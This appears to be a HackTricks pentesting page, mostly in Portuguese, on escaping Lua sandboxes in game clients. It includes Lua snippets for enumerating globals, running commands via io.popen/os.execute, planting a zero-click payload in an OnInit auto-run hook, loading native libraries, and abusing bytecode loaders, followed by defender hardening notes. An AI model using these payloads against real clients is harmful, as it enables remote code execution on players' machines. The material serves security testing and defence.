# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Esta página reúne técnicas práticas para enumerar e escapar de sandboxes de Lua embutidos em aplicações (notadamente game clients, plugins, or in-app scripting engines). Muitas engines expõem um ambiente Lua restrito, mas deixam globals poderosos acessíveis que permitem execução arbitrária de comandos ou até corrupção de memória nativa quando bytecode loaders estão expostos.

Ideias principais:
- Trate a VM como um ambiente desconhecido: enumere _G e descubra quais primitives perigosas estão acessíveis.
- Quando stdout/print estiver bloqueado, abuse de qualquer canal UI/IPC in-VM como output sink para observar os resultados.
- Se io/os estiver exposto, frequentemente você tem execução direta de comandos (io.popen, os.execute).
- Se load/loadstring/loadfile estiverem expostos, executar crafted Lua bytecode pode subverter a segurança de memória em algumas versões (≤5.1 verifiers são bypassáveis; 5.2 removed verifier), permitindo exploração avançada.

## Enumerar o ambiente sandboxed

- Faça dump do ambiente global para inventariar reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Se print() não estiver disponível, reaproveite in-VM channels. Exemplo de um MMO housing script VM onde chat output só funciona após uma sound call; o seguinte constrói uma função de output confiável:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalize esse padrão para o seu alvo: qualquer textbox, toast, logger ou UI callback que aceite strings pode agir como stdout para reconnaissance.

## Execução direta de comandos se io/os estiver exposto

Se o sandbox ainda expõe as bibliotecas padrão io ou os, você provavelmente tem execução imediata de comandos:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notas:
- A execução ocorre dentro do processo do cliente; muitas camadas anti-cheat/antidebug que bloqueiam debuggers externos não impedirão a criação de processos in-VM.
- Verifique também: package.loadlib (carregamento arbitrário de DLL/.so), require com módulos nativos, LuaJIT's ffi (se presente), e a debug library (pode elevar privilégios dentro da VM).

## Zero-click triggers via auto-run callbacks

Se a aplicação host envia scripts para os clientes e a VM expõe auto-run hooks (e.g., OnInit/OnLoad/OnEnter), coloque seu payload ali para drive-by compromise assim que o script for carregado:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Qualquer callback equivalente (OnLoad, OnEnter, etc.) generaliza essa técnica quando scripts são transmitidos e executados no cliente automaticamente.

## Primitivas perigosas para caçar durante o recon

Durante a enumeração de _G, procure especificamente por:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: executam source ou bytecode; suportam carregar bytecode não confiável.
- package, package.loadlib, require: carregamento dinâmico de bibliotecas e superfície de módulos.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, e hooks.
- LuaJIT-only: ffi.cdef, ffi.load para chamar código nativo diretamente.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalada opcional: abusando de Lua bytecode loaders

Quando load/loadstring/loadfile estão acessíveis mas io/os estão restritos, a execução de crafted Lua bytecode pode levar a memory disclosure e primitives de corrupção. Fatos-chave:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Workflows tipicamente: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

Este caminho é específico ao engine/version e requer RE. Veja as referências para deep dives, exploitation primitives, e exemplos de gadgetry em games.

## Detection and hardening notes (for defenders)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
